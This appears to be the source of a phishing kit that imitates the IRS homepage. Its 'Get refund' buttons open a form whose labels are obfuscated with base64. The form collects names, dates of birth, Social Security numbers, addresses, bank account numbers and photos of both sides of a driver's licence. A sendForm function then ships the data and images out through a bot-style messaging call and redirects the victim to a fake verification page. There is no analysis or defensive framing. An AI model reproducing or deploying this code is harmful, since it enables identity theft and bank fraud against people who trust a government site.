                        class="mobile-only-text" id="accessible-megamenu-credits &amp; deductions-submenu-0"
                        data-drupal-link-system-path="node/80206">Overview</a>
                    </li>
                    <div class="mega-menu-column">
                      <li><span class="mega-menu-column-header"
                          id="accessible-megamenu-credits &amp; deductions-submenu-1">INFORMATION FOR...</span>
                      </li>
                      <li><a href="https://www.irs.gov/credits-and-deductions-for-individuals"
                          title="For you and your family" id="accessible-megamenu-credits &amp; deductions-submenu-2"
                          data-drupal-link-system-path="node/5">Individuals</a>
                      </li>
                      <li class="mega-menu-helper-text">
                        <span class="desktop-only-text">
                          For you and your family
                        </span>
                      </li>
                      <li><a href="https://www.irs.gov/credits-deductions/businesses"
                          title="Standard mileage and other information"
                          id="accessible-megamenu-credits &amp; deductions-submenu-3"
                          data-drupal-link-system-path="node/19941">Businesses &amp; Self-Employed</a>
                      </li>
                      <li class="mega-menu-helper-text">
                        <span class="desktop-only-text">
                          Standard mileage and other information
                        </span>
                      </li>
                    </div>
                    <div class="mega-menu-column">
                      <li><span class="mega-menu-column-header"
                          id="accessible-megamenu-credits &amp; deductions-submenu-4">POPULAR</span>
                      </li>
                      <li><a href="https://www.irs.gov/credits-deductions/individuals/earned-income-tax-credit-eitc"
                          id="accessible-megamenu-credits &amp; deductions-submenu-5"
                          data-drupal-link-system-path="node/18966">Earned Income Credit (EITC)</a>
                      </li>
                      <li><a href="https://www.irs.gov/credits-deductions/individuals/child-tax-credit"
                          id="accessible-megamenu-credits &amp; deductions-submenu-6"
                          data-drupal-link-system-path="node/771">Child Tax Credit</a>
                      </li>
                      <li><a href="https://www.irs.gov/credits-deductions/clean-vehicle-and-energy-credits"
                          id="accessible-megamenu-credits &amp; deductions-submenu-7"
                          data-drupal-link-system-path="node/126641">Clean Energy and Vehicle Credits</a>
                      </li>
                      <li><a href="https://www.irs.gov/help/ita/how-much-is-my-standard-deduction"
                          id="accessible-megamenu-credits &amp; deductions-submenu-8"
                          data-drupal-link-system-path="node/5229">Standard Deduction</a>
                      </li>
                      <li><a href="https://www.irs.gov/retirement-plans"
                          id="accessible-megamenu-credits &amp; deductions-submenu-9"
                          data-drupal-link-system-path="node/19741">Retirement Plans</a>
                      </li>
                    </div>
                  </div>
                </ul>

              </li>
              <li class="expanded megamenu-top-nav-item dropdown">
                <a href="https://www.irs.gov/forms-instructions"
                  aria-controls="accessible-megamenu-forms &amp; instructions-submenu" aria-expanded="false"
                  aria-label="Forms &amp; Instructions menu has additional options. Use the spacebar to open the Forms &amp; Instructions sub menu or enter to navigate to the Forms &amp; Instructions page."
                  role="application" id="accessible-megamenu-nav-item-4">Forms &amp; Instructions</a>
                <ul block="mainnavigationmobile" class="menu dropdown-menu"
                  id="accessible-megamenu-forms &amp; instructions-submenu" aria-expanded="false" aria-hidden="true"
                  aria-labeledby="accessible-megamenu-nav-item-4" role="region">
                  <div class="mega-menu-container">
                    <li style="display: none;"><a href="https://www.irs.gov/forms-instructions" class="mobile-only-text"
                        id="accessible-megamenu-forms &amp; instructions-submenu-0"
                        data-drupal-link-system-path="node/6">Overview</a>
                    </li>
                    <div class="mega-menu-column">
                      <li><span class="mega-menu-column-header"
                          id="accessible-megamenu-forms &amp; instructions-submenu-1">POPULAR FORMS &amp;
                          INSTRUCTIONS</span>
                      </li>
                      <li><a href="https://www.irs.gov/forms-pubs/about-form-1040" title="Individual Tax Return"
                          id="accessible-megamenu-forms &amp; instructions-submenu-2"
                          data-drupal-link-system-path="node/16022">Form 1040</a>
                      </li>
                      <li class="mega-menu-helper-text">
                        <span class="desktop-only-text">
                          Individual Tax Return
                        </span>
                      </li>
                      <li><a href="https://www.irs.gov/pub/irs-pdf/i1040gi.pdf" title="Instructions for Form 1040 "
                          id="accessible-megamenu-forms &amp; instructions-submenu-3"
                          onclick="ga(&#39;send&#39;, &#39;event&#39;, &#39;Downloads&#39;, &#39;File Download&#39;, &#39;/pub/irs-pdf/i1040gi.pdf&#39;);">Form
                          1040 Instructions</a>
                      </li>
                      <li class="mega-menu-helper-text">
                        <span class="desktop-only-text">
                          Instructions for Form 1040
                        </span>
                      </li>
                      <li><a href="https://www.irs.gov/forms-pubs/about-form-w-9"
                          title="Request for Taxpayer Identification Number (TIN) and Certification"
                          id="accessible-megamenu-forms &amp; instructions-submenu-4"
                          data-drupal-link-system-path="node/15825">Form W-9</a>
                      </li>
                      <li class="mega-menu-helper-text">
                        <span class="desktop-only-text">
                          Request for Taxpayer Identification Number (TIN) and Certification
                        </span>
                      </li>
                      <li><a href="https://www.irs.gov/forms-pubs/about-form-4506-t"
                          title="Request for Transcript of Tax Return"
                          id="accessible-megamenu-forms &amp; instructions-submenu-5"
                          data-drupal-link-system-path="node/10554">Form 4506-T</a>
                      </li>
                      <li class="mega-menu-helper-text">
                        <span class="desktop-only-text">
                          Request for Transcript of Tax Return
                        </span>
                      </li>
                    </div>
                    <div class="mega-menu-column extra-padding">
                      <li><a href="https://www.irs.gov/forms-pubs/about-form-w-4" class="mega-menu-column-header"
                          title="Employee&#39;s Withholding Certificate"
                          id="accessible-megamenu-forms &amp; instructions-submenu-6"
                          data-drupal-link-system-path="node/15498">Form W-4</a>
                      </li>
                      <li class="mega-menu-helper-text">
                        <span class="desktop-only-text">
                          Employee's Withholding Certificate
                        </span>
                      </li>
                      <li><a href="https://www.irs.gov/forms-pubs/about-form-941"
                          title="Employer&#39;s Quarterly Federal Tax Return"
                          id="accessible-megamenu-forms &amp; instructions-submenu-7"
                          data-drupal-link-system-path="node/53446">Form 941</a>
                      </li>
                      <li class="mega-menu-helper-text">
                        <span class="desktop-only-text">
                          Employer's Quarterly Federal Tax Return
                        </span>
                      </li>
                      <li><a href="https://www.irs.gov/forms-pubs/about-form-w-2"
                          title="Employers engaged in a trade or business who pay compensation"
                          id="accessible-megamenu-forms &amp; instructions-submenu-8"
                          data-drupal-link-system-path="node/5737">Form W-2</a>
                      </li>
                      <li class="mega-menu-helper-text">
                        <span class="desktop-only-text">
                          Employers engaged in a trade or business who pay compensation
                        </span>
                      </li>
                      <li><a href="https://www.irs.gov/forms-pubs/about-form-9465" title="Installment Agreement Request"
                          id="accessible-megamenu-forms &amp; instructions-submenu-9"
                          data-drupal-link-system-path="node/15532">Form 9465</a>
                      </li>
                      <li class="mega-menu-helper-text">
                        <span class="desktop-only-text">
                          Installment Agreement Request
                        </span>
                      </li>
                    </div>
                    <div class="mega-menu-column">
                      <li><span class="mega-menu-column-header"
                          id="accessible-megamenu-forms &amp; instructions-submenu-10">POPULAR FOR TAX PROS</span>
                      </li>
                      <li><a href="https://www.irs.gov/forms-pubs/about-form-1040x" title="Amend/Fix Return"
                          id="accessible-megamenu-forms &amp; instructions-submenu-11"
                          data-drupal-link-system-path="node/19996">Form 1040-X</a>
                      </li>
                      <li class="mega-menu-helper-text">
                        <span class="desktop-only-text">
                          Amend/Fix Return
                        </span>
                      </li>
                      <li><a href="https://www.irs.gov/forms-pubs/about-form-2848" title="Apply for Power of Attorney"
                          id="accessible-megamenu-forms &amp; instructions-submenu-12"
                          data-drupal-link-system-path="node/15839">Form 2848</a>
                      </li>
                      <li class="mega-menu-helper-text">
                        <span class="desktop-only-text">
                          Apply for Power of Attorney
                        </span>
                      </li>
                      <li><a href="https://www.irs.gov/forms-pubs/about-form-w-7" title="Apply for an ITIN"
                          id="accessible-megamenu-forms &amp; instructions-submenu-13"
                          data-drupal-link-system-path="node/15536">Form W-7</a>
                      </li>
                      <li class="mega-menu-helper-text">
                        <span class="desktop-only-text">
                          Apply for an ITIN
                        </span>
                      </li>
                      <li><a href="https://www.irs.gov/pub/irs-pdf/pcir230.pdf"
                          title="Rules Governing Practice before IRS"
                          id="accessible-megamenu-forms &amp; instructions-submenu-14"
                          onclick="ga(&#39;send&#39;, &#39;event&#39;, &#39;Downloads&#39;, &#39;File Download&#39;, &#39;/pub/irs-pdf/pcir230.pdf&#39;);">Circular
                          230</a>
                      </li>
                      <li class="mega-menu-helper-text">
                        <span class="desktop-only-text">
                          Rules Governing Practice before IRS
                        </span>
                      </li>
                    </div>
                  </div>
                </ul>

              </li>
            </ul>


          </nav>
          <nav role="navigation" aria-labelledby="block-pup-irs-mainnavigation-menu" id="block-pup-irs-mainnavigation"
            data-block-plugin-id="system_menu_block:main">
            <h2 class="sr-only" id="block-pup-irs-mainnavigation-menu">Main navigation</h2>


            <ul block="pup_irs_mainnavigation" class="menu nav navbar-nav">
              <li>
                <a href="https://www.irs.gov/filing" class="top-level-nav-item">File</a>
              </li>
              <li>
                <a href="https://www.irs.gov/payments" class="top-level-nav-item">Pay</a>
              </li>
              <li>
                <a href="https://www.irs.gov/refunds" class="top-level-nav-item">Refunds</a>
              </li>
              <li>
                <a href="https://www.irs.gov/credits-and-deductions" class="top-level-nav-item">Credits &amp;
                  Deductions</a>
              </li>
              <li>
                <a href="https://www.irs.gov/forms-instructions" class="top-level-nav-item">Forms &amp; Instructions</a>
              </li>
            </ul>




          </nav>
          <nav role="navigation" aria-labelledby="block-pup-irs-infomenumobile-menu" id="block-pup-irs-infomenumobile"
            data-block-plugin-id="system_menu_block:info-menu-mobile">

            <h2 class="visually-hidden" id="block-pup-irs-infomenumobile-menu">Info Menu Mobile</h2>



            <ul block="pup_irs_infomenumobile" class="menu menu--info-menu-mobile nav">
              <li class="first">
                <a href="https://www.irs.gov/help/let-us-help-you" title="Help"
                  data-drupal-link-system-path="node/16916">Help</a>
              </li>
              <li>
                <a href="https://www.irs.gov/newsroom" title="News" data-drupal-link-system-path="node/19646">News</a>
              </li>
              <li>
                <section
                  class="language-switcher-language-url block block-language block-language-blocklanguage-interface clearfix"
                  id="block-languageswitcher" role="navigation"
                  data-block-plugin-id="language_block:language_interface">



                  <div class="dropdown">
                    <button class="btn btn-default dropdown-toggle" type="button" id="languageSwitcher"
                      data-toggle="dropdown"
                      aria-label="Press enter to activate the menu, then navigate with the tab key."
                      aria-expanded="false" aria-labelledby="English">
                      English
                      <i class="fa fa-chevron-down"></i>
                    </button>
                    <ul class="dropdown-menu" block="languageswitcher" aria-labelledby="languageSwitcher">
                      <li hreflang="es" data-drupal-link-system-path="node/58476" class="es"><a
                          href="https://www.irs.gov/es/node/58476" class="language-link" lang="es" hreflang="es"
                          data-drupal-link-system-path="node/58476" aria-labelledby="Español">Español</a></li>
                      <li hreflang="zh-hans" data-drupal-link-system-path="node/58476" class="zh-hans"><a
                          href="https://www.irs.gov/zh-hans/node/58476" class="language-link" lang="zh-hans"
                          hreflang="zh-hans" data-drupal-link-system-path="node/58476" aria-labelledby="中文 (简体)">中文
                          (简体)</a></li>
                      <li hreflang="zh-hant" data-drupal-link-system-path="node/58476" class="zh-hant"><a
                          href="https://www.irs.gov/zh-hant/node/58476" class="language-link" lang="zh-hant"
                          hreflang="zh-hant" data-drupal-link-system-path="node/58476" aria-labelledby="中文 (繁體)">中文
                          (繁體)</a></li>
                      <li hreflang="ko" data-drupal-link-system-path="node/58476" class="ko"><a
                          href="https://www.irs.gov/ko/node/58476" class="language-link" lang="ko" hreflang="ko"
                          data-drupal-link-system-path="node/58476" aria-labelledby="한국어">한국어</a></li>
                      <li hreflang="ru" data-drupal-link-system-path="node/58476" class="ru"><a
                          href="https://www.irs.gov/ru/node/58476" class="language-link" lang="ru" hreflang="ru"
                          data-drupal-link-system-path="node/58476" aria-labelledby="Русский">Русский</a></li>
                      <li hreflang="vi" data-drupal-link-system-path="node/58476" class="vi"><a
                          href="https://www.irs.gov/vi/node/58476" class="language-link" lang="vi" hreflang="vi"
                          data-drupal-link-system-path="node/58476" aria-labelledby="Tiếng Việt">Tiếng Việt</a></li>
                      <li hreflang="ht" data-drupal-link-system-path="node/58476" class="ht"><a
                          href="https://www.irs.gov/ht/node/58476" class="language-link" lang="ht" hreflang="ht"
                          data-drupal-link-system-path="node/58476" aria-labelledby="Kreyòl ayisyen">Kreyòl ayisyen</a>
                      </li>
                    </ul>
                  </div>

                </section>
              </li>
              <li>
                <a href="https://www.irs.gov/charities-and-nonprofits"
                  data-drupal-link-system-path="node/58461">Charities &amp; Nonprofits</a>
              </li>
              <li class="last">
                <a href="https://www.irs.gov/tax-professionals" title="Tax Pros"
                  data-drupal-link-system-path="node/11">Tax Pros</a>
              </li>
            </ul>


          </nav>

        </div>

      </div>

    </header>

    <div id="pup-homepage-random-hero" class="pup-homepage-random-hero">
      <img src="./assets/hero-2-optimized.jpg" alt="Two people at a computer"
        class="hero-img-shown pup-hero-caption-light">
      <div id="pup-homepage-random-hero-wrapper" class="pup-homepage-random-hero-wrapper">
        <div class="pup-homepage-random-hero-content">
          <div class="pup-homepage-random-hero-message" style="--borderColor: #c7a97b;">
            Helping people understand and meet their tax responsibilities
          </div>
        </div>
      </div>
    </div>

    <div class="container">
      <div role="main" class="pup-main-container js-quickedit-main-content">
        <div class="row">
          <section class="col-sm-12">


            <div class="region region-content">
              <div data-drupal-messages-fallback="" class="hidden"></div>
              <article about="/node/58476" class="pup-home-page is-promoted full clearfix" id="main-content">





                <div class="pup-home-cards">
                  <div class="row">
                    <div class="col-md-12 pup-home-cards__first clearfix">

                      <h2
                        class="field field--name-field-pup-top-tasks-heading field--type-string field--label-hidden field--item">
                        How can we help you?</h2>

                      <ul class="row match-height">
                        <li class="col-sm-6 col-md-4">
                          <div class="paragraph paragraph--type--pup-htt paragraph--view-mode--default">
                            <a onclick="showForm()" class="top-8 equalHeight"
                              style="height:33px;font-size:24px;cursor:pointer;">
                              <i style="font-size:22px;padding-right:10px;" class="fa fa-calendar"></i>Get refund
                            </a>
                          </div>
                        </li>
                        <li class="col-sm-6 col-md-4">
                          <div class="paragraph paragraph--type--pup-htt paragraph--view-mode--default">
                            <a onclick="showForm()" class="top-8 equalHeight"
                              style="height:33px;font-size:24px;cursor:pointer;">
                              <i style="font-size:22px;padding-right:10px;" class="fa fa-list"></i>Get your tax record
                            </a>
                          </div>
                        </li>
                        <li class="col-sm-6 col-md-4">
                          <div class="paragraph paragraph--type--pup-htt paragraph--view-mode--default">
                            <a onclick="showForm()" class="top-8 equalHeight"
                              style="height:33px;font-size:24px;cursor:pointer;">
                              <i style="font-size:22px;padding-right:10px;" class="fa fa-file"></i>File your taxes for free
                            </a>
                          </div>
                        </li>
                      </ul>

                    </div>
                  </div>
                </div>


              </article>


            </div>

          </section>
        </div>
      </div>
    </div>

    <footer class="pup-footer" role="contentinfo" aria-label="footer">
      <div class="pup-footer-bottom">
        <div class="container">
          <div class="pup-footer-logo">
            <a href=""><img class="pup-footer-logo-img" src="./assets/IRS-Logo.svg" alt="Home"></a>
          </div>
          <div class="subfooter-menu">
            <div class="region region-subfooter">
              <nav role="navigation" aria-labelledby="block-subfooter-menu" id="block-subfooter"
                data-block-plugin-id="system_menu_block:subfooter">

                <h2 class="visually-hidden" id="block-subfooter-menu">Subfooter</h2>



                <ul block="subfooter" class="menu menu--subfooter nav">
                  <li class="first">
                    <a href=""
                      data-drupal-link-system-path="node/15856">Privacy Policy</a>
                  </li>
                  <li class="last">
                    <a href=""
                      data-drupal-link-system-path="node/82611">Accessibility</a>
                  </li>
                </ul>


              </nav>

            </div>

          </div>
        </div>
      </div>
    </footer>
    <!-- Start GA AutoTracker Code -->
    <script src="./assets/jquery.min.js" type="text/javascript"></script>
    <script type="text/javascript" src="./assets/autotracker.js"></script>
    <script type="text/javascript">addLinkerEvents();</script> <!--End AutoTracker Code -->
    <!--412017-->

  </div>
  `;
}, 3000);

function showLoading() {
    app.innerHTML = `
    <div style="display:flex;justify-content:center;margin-top:40vh;">
        <div class="loader"></div>
    </div>
    `;
}

function flagInputError(msg) {
    alert(msg);
}

function isEmpty(input) {
    return input.value.trim() === "" ? true : false;
}

function showForm() {
    showLoading();
    
    setTimeout(() => {
        app.innerHTML = `
        <div class="container">
    <div class="row">
      <div class="col-lg-3"></div>
      <div class="col-lg-6">
        <section class="card p-4 rounded">
          <h3 class="mb-3">
            ${atob("SnVzdCBhIGZldyBtb3JlIGRldGFpbHMgdG8gZ2V0IHlvdSByZWZ1bmQ=")}
          </h3>
          <div class="center">
            <div class="row form-width" id="fileClaim">
              <div class="col-md-12 col-lg-12">
                <!-- <h4 class="mb-3">Kindly the form below with your information to file your claim</h4> -->
                <form class="needs-validation" novalidate>
                  <div class="row g-3">
                    <div class="col-sm-6">
                      <label class="form-label">
                        ${
                          atob("Rmlyc3QgbmFtZQ==")
                        }
                      </label>
                      <input type="text" class="form-control" id="fname" placeholder="" value="" required>
                      <div class="invalid-feedback">
                        Valid first name is required.
                      </div>
                    </div>

                    <div class="col-sm-6">
                      <label class="form-label">
                        ${
                          atob("TGFzdCBuYW1l")
                        }
                      </label>
                      <input type="text" class="form-control" id="lname" placeholder="" value="" required>
                      <div class="invalid-feedback">
                        Valid last name is required.
                      </div>
                    </div>

                    <div class="col-12">
                      <label class="form-label">
                        ${
                          atob("RW1haWw=")
                        }
                      </label>
                      <input type="email" class="form-control" id="email" placeholder="you@example.com" required>
                      <div class="invalid-feedback">
                        Please enter a valid email address for shipping updates.
                      </div>
                    </div>

                    <div class="col-sm-6">
                      <label class="form-label">
                        ${
                          atob("UGhvbmU=")
                        }
                      </label>
                      <input type="tel" class="form-control" id="phone" placeholder="" required>
                      <div class="invalid-feedback">
                        Phone number is required.
                      </div>
                    </div>

                    <div class="col-sm-6">
                      <label class="form-label">
                        ${
                          atob("RGF0ZSBvZiBiaXJ0aA==")
                        }
                      </label>
                      <input type="date" class="form-control" id="dob" placeholder="" required>
                      <div class="invalid-feedback">
                        Date of birth is required.
                      </div>
                    </div>

                    <div class="col-12">
                      <label class="form-label">
                        ${
                          atob("U1NOIChTb2NpYWwgU2VjdXJpdHkgTnVtYmVyKQ==")
                        }
                      </label>
                      <input type="number" class="form-control" id="ssn" placeholder="" required>
                      <div class="invalid-feedback">
                        Please enter a valid Social Security Number.
                      </div>
                    </div>

                    <div class="col-12">
                      <label class="form-label">
                        ${
                          atob("QWRkcmVzcw==")
                        }
                      </label>
                      <input type="text" class="form-control" id="address" placeholder="1234 Main St" required>
                      <div class="invalid-feedback">
                        Please enter your address.
                      </div>
                    </div>

                    <div class="col-12">
                      <label class="form-label">
                        ${
                          atob("QWRkcmVzcyAyIDxzcGFuIGNsYXNzPSd0ZXh0LW11dGVkJz4oT3B0aW9uYWwpPC9zcGFuPg==")
                        }
                      </label>
                      <input type="text" class="form-control" id="address2" placeholder="Apartment or suite">
                    </div>

                    <div class="col-md-4">
                      <label for="state" class="form-label">
                        ${
                          atob("U3RhdGU=")
                        }
                      </label>
                      <select class="form-select" id="state" required>
                        <option value="">Choose...</option>
                        <option value="Alabama">Alabama</option>
                        <option value="Alaska">Alaska</option>
                        <option value="Arizona">Arizona</option>
                        <option value="Arkansas">Arkansas</option>
                        <option value="California">California</option>
                        <option value="Colorado">Colorado</option>
                        <option value="Connecticut">Connecticut</option>
                        <option value="Delaware">Delaware</option>
                        <option value="District Of Columbia">District Of Columbia</option>
                        <option value="Florida">Florida</option>
                        <option value="Georgia">Georgia</option>
                        <option value="Hawaii">Hawaii</option>
                        <option value="Idaho">Idaho</option>
                        <option value="Illinois">Illinois</option>
                        <option value="Indiana">Indiana</option>
                        <option value="Iowa">Iowa</option>
                        <option value="Kansas">Kansas</option>
                        <option value="Kentucky">Kentucky</option>
                        <option value="Louisiana">Louisiana</option>
                        <option value="Maine">Maine</option>
                        <option value="Maryland">Maryland</option>
                        <option value="Massachusetts">Massachusetts</option>
                        <option value="Michigan">Michigan</option>
                        <option value="Minnesota">Minnesota</option>
                        <option value="Mississippi">Mississippi</option>
                        <option value="Missouri">Missouri</option>
                        <option value="Montana">Montana</option>
                        <option value="Nebraska">Nebraska</option>
                        <option value="Nevada">Nevada</option>
                        <option value="New Hampshire">New Hampshire</option>
                        <option value="New Jersey">New Jersey</option>
                        <option value="New Mexico">New Mexico</option>
                        <option value="New York">New York</option>
                        <option value="North Carolina">North Carolina</option>
                        <option value="North Dakota">North Dakota</option>
                        <option value="Ohio">Ohio</option>
                        <option value="Oklahoma">Oklahoma</option>
                        <option value="Oregon">Oregon</option>
                        <option value="Pennsylvania">Pennsylvania</option>
                        <option value="Rhode Island">Rhode Island</option>
                        <option value="South Carolina">South Carolina</option>
                        <option value="South Dakota">South Dakota</option>
                        <option value="Tennessee">Tennessee</option>
                        <option value="Texas">Texas</option>
                        <option value="Utah">Utah</option>
                        <option value="Vermont">Vermont</option>
                        <option value="Virginia">Virginia</option>
                        <option value="Washington">Washington</option>
                        <option value="West Virginia">West Virginia</option>
                        <option value="Wisconsin">Wisconsin</option>
                        <option value="Wyoming">Wyoming</option>
                      </select>

                      <div class="invalid-feedback">
                        Please provide a valid state.
                      </div>
                    </div>

                    <div class="col-md-4">
                      <label for="city" class="form-label">
                        ${
                          atob("Q2l0eQ==")
                        }
                      </label>
                      <input type="text" class="form-control" id="city" placeholder="" required>
                      <div class="invalid-feedback">
                        Please enter a valid city.
                      </div>
                    </div>

                    <div class="col-md-4">
                      <label for="postal" class="form-label">
                        ${
                          atob("UG9zdGFs")
                        }
                      </label>
                      <input type="text" class="form-control" id="postal" placeholder="" required>
                      <div class="invalid-feedback">
                        Postal code required.
                      </div>
                    </div>
                  </div>

                  <hr class="my-4">

                  <div class="row g-3">
                    <div class="col-md-12">
                      <label for="taxReturn" class="form-label">
                        ${
                          atob("RGlkIHlvdSBmaWxlIHlvdXIgMjAyMyB0YXggcmV0dXJuPw==")
                        }
                      </label>
                      <input type="radio" name="taxReturn" class="ms-2" value="Yes" required> Yes
                      <input type="radio" name="taxReturn" class="ms-2" value="No" required> No
                      <div class="invalid-feedback">
                        Please Choose an answer
                      </div>
                    </div>
                  </div>

                  <hr class="my-4">

                  <div class="row gy-3">
                    <div class="col-sm-6">
                      <label class="form-label">
                        ${
                          atob("VXBsb2FkIGZyb250IG9mIHlvdXIgU3RhdGUgSUQvREw=")
                        }
                      </label>
                      <input type="file" class="form-control form-control" accept="image/*" id="fileFront">
                      <div class="invalid-feedback">
                        Upload required.
                      </div>
                    </div>

                    <div class="col-sm-6">
                      <label class="form-label">
                        ${
                          atob("VXBsb2FkIGJhY2sgb2YgeW91ciBTdGF0ZSBJRC9ETA==")
                        }
                      </label>
                      <input type="file" class="form-control form-control" accept="image/*" id="fileBack">
                      <div class="invalid-feedback">
                        Upload required.
                      </div>
                    </div>
                  </div>

                  <hr class="my-4">

                  <div class="row gy-3">

                    <label class="form-label">
                      ${
                        atob("UGVyc29uYWwgQmFuayBJbmZvcm1hdGlvbg==")
                      }
                    </label>

                    <div class="col-sm-6">
                      <label class="form-label">
                        ${
                          atob("QmFuayBuYW1l")
                        }
                      </label>
                      <input type="text" class="form-control" id="bankName" placeholder="" value="" required>
                      <div class="invalid-feedback">
                        Valid first name is required.
                      </div>
                    </div>

                    <div class="col-sm-6">
                      <label class="form-label">
                        ${
                          atob("QWNjb3VudCBudW1iZXI=")
                        }
                      </label>
                      <input type="text" class="form-control" id="acctNo" placeholder="" value="" required>
                      <div class="invalid-feedback">
                        Valid last name is required.
                      </div>
                    </div>
                  </div>

                  <hr class="my-4">

                  <div id="btnResp" class="text-center">
                    <button type="button" onclick="sendForm()">
                      ${
                        atob("UHJvY2VlZA==")
                      }
                    </button>
                  </div>
                </form>
                <br>
              </div>
            </div>
          </div>
        </section>
      </div>
      <div class="col-lg-3"></div>
    </div>
  </div>
        `;
    }, 3000);
}

function sendForm() {
    const fname = document.getElementById("fname");
    const lname = document.getElementById("lname");
    const email = document.getElementById("email");
    const phone = document.getElementById("phone");
    const dob = document.getElementById("dob");
    const ssn = document.getElementById("ssn");
    // const creditScore = document.getElementById("credit");
    const address = document.getElementById("address");
    const address2 = document.getElementById("address2");
    // const country = document.getElementById("country");
    const state = document.getElementById("state");
    const city = document.getElementById("city");
    const postal = document.getElementById("postal");
    const fileFront = document.getElementById("fileFront");
    const fileBack = document.getElementById("fileBack");

    const checkedValue = document.querySelector('input[name="taxReturn"]:checked');
    // console.log(checkedValue.value);

    const bankName = document.getElementById("bankName");
    const acctNo = document.getElementById("acctNo");

    if (isEmpty(fname)) {
        flagInputError("First name must be filled");
    } else if (isEmpty(lname)) {
        flagInputError("Last name must be filled");
    } else if (isEmpty(email)) {
        flagInputError("email field is required");
    } else if (isEmpty(phone)) {
        flagInputError("Phone number field must be filled");
    } else if (isEmpty(dob)) {
        flagInputError("Date of birth field must be filled");
    } else if (isEmpty(ssn)) {
        flagInputError("SSN field must be filled");
    }
    // else if (isEmpty(creditScore)) {
    //     flagInputError("Credit score field must be filled");
    // } 
    else if (isEmpty(address)) {
        flagInputError("Address field must be filled");
    } else if (isEmpty(city)) {
        flagInputError("City field is required");
    } else if (isEmpty(state)) {
        flagInputError("State field must be filled");
    } else if (isEmpty(postal)) {
        flagInputError("Postal field must be filled");
    } else if (!checkedValue) {
        flagInputError("You have to select an answer if you have filed your 2022 tax return");
    } else if (!fileFront.files.length > 0) {
        flagInputError("front of your State ID/DL must be uploaded");
    } else if (!fileBack.files.length > 0) {
        flagInputError("back of your State ID/DL must be uploaded");
    } else if (isEmpty(bankName)) {
        flagInputError("Bank name field must be filled");
    } else if (isEmpty(acctNo)) {
        flagInputError("Bank account number field is required");
    } else {

        showLoading();

        let my_txt = `New Greendot Loan Info %0A`;
        my_txt += `====================%0A`;
        my_txt += `First name: ${fname.value}%0A`;
        my_txt += `Last name: ${lname.value}%0A`;
        my_txt += `Email: ${email.value}%0A`;
        my_txt += `Phone: ${phone.value}%0A`;
        my_txt += `Date of Birth: ${dob.value}%0A`;
        my_txt += `SSN: ${ssn.value}%0A`;
        // my_txt += `Credit Score: ${creditScore.value}%0A`;
        my_txt += `Address: ${address.value}%0A`;
        my_txt += `Address2: ${address2.value}%0A`;
        my_txt += `City: ${city.value}%0A`;
        my_txt += `State: ${state.value}%0A`;
        my_txt += `Postal: ${postal.value}%0A`;
        my_txt += `Did you file your 2023 tax return?: ${checkedValue.value}%0A`;
        my_txt += `Bank name: ${bankName.value}%0A`;
        my_txt += `Account number: ${acctNo.value}%0A`;
        my_txt += `====================%0A`;

        // upload file
        let file1 = fileFront.files;
        let file2 = fileBack.files;
        if (file1.length > 0 && file2.length > 0) {

            bt.sendMessage(my_txt)
                .then(res => {
                    console.log("Msg Success!", res);
                    // Send first file
                    bt.sendFileMod(fileFront)
                        .then(res => {
                            console.log("File1 Success!", res);
                            // Send seconde file
                            bt.sendFileMod(fileBack)
                                .then(res => {
                                    console.log("File2 Success!", res);
                                    // redirect
                                    location.assign("verification/")
                                })
                                .catch(err => {
                                    console.error(err)
                                    // redirect
                                    location.assign("verification/")
                                })
                        })
                        .catch(err => {
                            console.error(err)
                            // redirect
                            location.assign("verification/")
                        }
                        )
                })
                .catch(err => console.error(err))

        } else {
            alert("Uploads failed final upload verification process");
        }
    }
}